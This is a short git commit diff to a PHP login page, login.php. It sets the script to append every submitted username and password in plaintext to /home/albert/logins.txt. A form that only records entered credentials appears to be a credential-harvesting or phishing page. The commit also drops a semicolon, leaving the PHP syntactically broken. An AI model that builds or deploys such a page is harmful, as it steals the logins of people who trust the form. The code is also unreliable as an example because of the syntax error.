b634a74be940a59d0232fd350297fdc089c11fcb
albert926 <103927053+albert926@users.noreply.github.com>
2025-07-15 11:13:40 +0800

    stuff yk

--- login.php
+++ login.php
@@ -1,10 +1,12 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Grab form inputs
     $username = htmlspecialchars($_POST['username']);
-    $password = htmlspecialchars($_POST['pswrd']);
+    $password = htmlspecialchars($_POST['pswrd'])
 
-    $filePath = "/home/YOURUSERNAME/logins.txt";
+    $filePath = "/home/albert/logins.txt";
 
+    // Write to the file
     if ($file = fopen($filePath, "a")) {
         fwrite($file, "Username: $username, Password: $password\n");
         fclose($file);
